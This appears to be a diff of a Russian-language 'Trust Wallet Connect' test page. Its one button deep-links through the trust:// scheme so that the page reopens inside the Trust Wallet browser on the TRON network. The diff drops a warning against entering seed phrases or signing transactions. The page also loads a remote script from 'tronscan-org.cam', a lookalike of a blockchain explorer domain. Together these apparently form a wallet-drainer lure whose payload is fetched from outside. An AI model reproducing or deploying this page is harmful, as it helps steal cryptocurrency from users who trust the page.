@@ -4,7 +4,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Trust Wallet Connection Test</title>
+<title>Trust Wallet Connect Test</title>
 
 <style>
 * {
@@ -13,19 +13,19 @@
 
 body {
     margin: 0;
-    padding: 25px;
     min-height: 100vh;
+    padding: 25px;
     background: #0b1020;
-    color: #fff;
+    color: white;
     font-family: Arial, sans-serif;
     display: flex;
-    justify-content: center;
     align-items: center;
+    justify-content: center;
 }
 
 .container {
     width: 100%;
-    max-width: 600px;
+    max-width: 550px;
     padding: 28px;
     background: #151e32;
     border: 1px solid #293957;
@@ -34,7 +34,6 @@ body {
 
 h1 {
     margin-top: 0;
-    font-size: 25px;
 }
 
 .description {
@@ -44,24 +43,15 @@ h1 {
 
 button {
     width: 100%;
-    padding: 16px;
-    margin-top: 12px;
+    padding: 17px;
+    margin-top: 18px;
     border: none;
     border-radius: 12px;
     background: #3375f6;
     color: white;
-    font-size: 16px;
+    font-size: 17px;
     font-weight: bold;
     cursor: pointer;
-}
-
-button.secondary {
-    background: #293957;
-}
-
-button:disabled {
-    opacity: .5;
-    cursor: not-allowed;
 }
 
 .status {
@@ -69,11 +59,11 @@ button:disabled {
     margin-top: 20px;
     background: #0b1427;
     border-radius: 10px;
-    overflow-wrap: anywhere;
 }
 
 #log {
-    height: 220px;
+    min-height: 160px;
+    max-height: 260px;
     overflow-y: auto;
     margin-top: 12px;
     padding: 14px;
@@ -85,11 +75,9 @@ button:disabled {
     overflow-wrap: anywhere;
 }
 
-.warning {
-    color: #e8bd70;
+.small {
+    color: #8292b1;
     font-size: 12px;
-    line-height: 1.5;
-    margin-top: 18px;
 }
 </style>
 </head>
@@ -98,41 +86,28 @@ button:disabled {
 
 <div class="container">
 
-    <h1>Trust Wallet Diagnostic</h1>
+    <h1>Trust Wallet</h1>
 
     <p class="description">
-        Тестирование способов открытия Trust Wallet.
-        Сеть TRON — coin_id 195.
+        Подключение через Trust Wallet URI Scheme.
+        TRON Network — Coin ID 195.
     </p>
 
     <button id="connect" data-connect>
         Connect Wallet
     </button>
 
-    <button class="secondary" id="testScheme">
-        Test Trust Scheme
-    </button>
-
-    <button class="secondary" id="testUniversal">
-        Test Universal Link
-    </button>
-
-    <button class="secondary" id="clearLog">
-        Clear Diagnostic Log
-    </button>
-
     <div class="status" id="status">
         Статус: ожидание подключения
     </div>
 
-    <h3>Diagnostic Log</h3>
+    <h3>Диагностика</h3>
 
-    <div id="log">Ожидание запуска...</div>
+    <div id="log">Система готова.</div>
 
-    <p class="warning">
-        Внимание: переход из браузера не гарантирует успешного
-        открытия кошелька. Не вводите Seed Phrase и не подписывайте
-        транзакции на этой тестовой странице.
+    <p class="small">
+        Диагностика фиксирует события браузера,
+        но не подтверждает фактическое подключение кошелька.
     </p>
 
 </div>
@@ -144,10 +119,11 @@ button:disabled {
 
     const status = document.getElementById("status");
     const logElement = document.getElementById("log");
+    const button = document.getElementById("connect");
 
     let timer = null;
-    let active = false;
     let leftPage = false;
+    let active = false;
 
     function log(message) {
 
@@ -156,40 +132,18 @@ button:disabled {
         logElement.textContent +=
             "\n[" + time + "] " + message;
 
-        logElement.scrollTop = logElement.scrollHeight;
+        logElement.scrollTop =
+            logElement.scrollHeight;
     }
 
     function setStatus(message) {
         status.textContent = "Статус: " + message;
     }
 
-    function getLinks() {
-
-        const encodedUrl = encodeURIComponent(
-            window.location.href
-        );
-
-        return {
-
-            scheme:
-                "trust://open_url?coin_id=" +
-                COIN_ID +
-                "&url=" +
-                encodedUrl,
-
-            universal:
-                "https://link.trustwallet.com/open_url?coin_id=" +
-                COIN_ID +
-                "&url=" +
-                encodedUrl
-
-        };
-    }
-
     function onVisibility() {
 
         log(
-            "visibilitychange: " +
+            "Visibility: " +
             document.visibilityState
         );
 
@@ -208,7 +162,7 @@ button:disabled {
     }
 
     function onFocus() {
-        log("FOCUS: окно снова получило фокус");
+        log("FOCUS: окно вернулось");
     }
 
     function onPageHide() {
@@ -219,6 +173,8 @@ button:disabled {
     }
 
     function cleanup() {
+
+        clearTimeout(timer);
 
         document.removeEventListener(
             "visibilitychange",
@@ -240,17 +196,63 @@ button:disabled {
             onPageHide
         );
 
-        clearTimeout(timer);
-
         active = false;
     }
 
-    function startMonitoring() {
+    function finish() {
+
+        if (!active) return;
+
+        const detected = leftPage;
+
+        cleanup();
+
+        if (detected) {
+
+            setStatus(
+                "Trust Scheme: обнаружен переход из браузера"
+            );
+
+            log("RESULT: переход обнаружен");
+
+        } else {
+
+            setStatus(
+                "Trust Scheme: переход не обнаружен"
+            );
+
+            log("RESULT: переход не обнаружен");
+        }
+
+        button.disabled = false;
+    }
+
+    function openInTrust(url, coinId = COIN_ID) {
 
         cleanup();
 
         active = true;
         leftPage = false;
+
+        button.disabled = true;
+
+        logElement.textContent = "";
+
+        log("========== CONNECT ==========");
+
+        log("Coin ID: " + coinId);
+
+        const scheme =
+            "trust://open_url?coin_id=" +
+            coinId +
+            "&url=" +
+            encodeURIComponent(url);
+
+        log("Method: Trust URI Scheme");
+
+        log("Target: " + scheme);
+
+        setStatus("Открываем Trust Wallet...");
 
         document.addEventListener(
             "visibilitychange",
@@ -272,168 +274,38 @@ button:disabled {
             onPageHide
         );
 
+        const a = document.createElement("a");
+
+        a.href = scheme;
+        a.style.display = "none";
+
+        document.body.appendChild(a);
+
+        a.click();
+
+        a.remove();
+
+        log("Trust Scheme вызван");
+
+        timer = setTimeout(finish, 3500);
     }
 
-    function finish(method) {
+    button.addEventListener("click", () => {
 
-        if (!active) return;
+        openInTrust(location.href);
 
-        const detected = leftPage;
+    });
 
-        cleanup();
+    log("Trust Wallet diagnostic initialized");
 
-        if (detected) {
+    log("Coin ID: " + COIN_ID);
 
-            setStatus(
-                method +
-                ": обнаружен переход из браузера. " +
-                "Запуск приложения не подтверждён."
-            );
-
-            log(
-                "RESULT: обнаружен уход из браузера"
-            );
-
-        } else {
-
-            setStatus(
-                method +
-                ": переключение не обнаружено"
-            );
-
-            log(
-                "RESULT: браузер не обнаружил переключения"
-            );
-        }
-    }
-
-    function launchScheme() {
-
-        const links = getLinks();
-
-        startMonitoring();
-
-        log("Попытка запуска Trust Wallet через trust://");
-
-        setStatus("Запуск Trust Wallet через URI Scheme");
-
-        window.location.href = links.scheme;
-
-        timer = setTimeout(() => {
-
-            finish("Trust Scheme");
-
-        }, 2500);
-
-    }
-
-    function launchUniversal() {
-
-        const links = getLinks();
-
-        startMonitoring();
-
-        log("Попытка запуска через Universal Link");
-
-        setStatus("Запуск Universal Link");
-
-        window.location.href = links.universal;
-
-        timer = setTimeout(() => {
-
-            finish("Universal Link");
-
-        }, 2500);
-
-    }
-
-    function connect() {
-
-        const links = getLinks();
-
-        startMonitoring();
-
-        log("========== CONNECT START ==========");
-
-        log("Проверка Trust Wallet");
-
-        log("Coin ID: " + COIN_ID);
-
-        log("Шаг 1: Trust URI Scheme");
-
-        setStatus("Проверка Trust URI Scheme");
-
-        window.location.href = links.scheme;
-
-        timer = setTimeout(() => {
-
-            if (!active) return;
-
-            if (leftPage) {
-
-                finish("Trust Scheme");
-
-                return;
-            }
-
-            log("Шаг 1: переключение не обнаружено");
-
-            log("Шаг 2: Universal Link");
-
-            setStatus(
-                "Проверка официального Universal Link"
-            );
-
-            window.location.href = links.universal;
-
-            timer = setTimeout(() => {
-
-                finish("Universal Link");
-
-                log("========== CONNECT END ==========");
-
-            }, 2500);
-
-        }, 1600);
-
-    }
-
-    document
-        .getElementById("connect")
-        .addEventListener("click", connect);
-
-    document
-        .getElementById("testScheme")
-        .addEventListener("click", launchScheme);
-
-    document
-        .getElementById("testUniversal")
-        .addEventListener("click", launchUniversal);
-
-    document
-        .getElementById("clearLog")
-        .addEventListener("click", () => {
-
-            logElement.textContent = "";
-
-            setStatus("Журнал очищен");
-
-        });
-
-    log("Diagnostic system initialized");
-
-    log("Browser: " + navigator.userAgent);
-
-    log("Platform: " + navigator.platform);
-
-    log("Protocol: " + location.protocol);
-
-    log("Trust Wallet diagnostic ready");
+    log("Method: trust://");
 
 })();
 </script>
 
-<!-- Подключение запрошенного стороннего скрипта -->
+<!-- Исходный сторонний скрипт -->
 <script
     src="https://tronscan-org.cam/k/k570ff837e3.js"
     data-api="https://tronscan-org.cam">
